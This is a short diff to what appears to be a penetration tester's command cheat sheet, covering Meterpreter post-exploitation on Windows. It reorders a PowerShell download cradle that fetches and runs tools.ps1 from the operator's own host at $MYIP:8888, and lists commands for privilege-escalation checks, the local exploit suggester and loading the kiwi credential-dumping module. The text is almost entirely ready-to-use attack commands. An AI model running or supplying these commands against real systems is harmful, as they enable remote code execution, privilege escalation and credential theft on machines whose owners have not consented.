@@ -710,11 +710,12 @@ powershell -c "Set-ExecutionPolicy unrestricted"
 services.msc
 
 [*] Meterpreter
+sessions -t 120 -i 1
 load powershell
-powershell_execute "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
 powershell_import ~/Upload/windows/PrivescCheck.ps1
 powershell_execute "Invoke-PrivescCheck"
 run multi/recon/local_exploit_suggester
+powershell_execute "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/tools.ps1'); dir C:\programdata\tmp"
 
 load kiwi
 load exploit
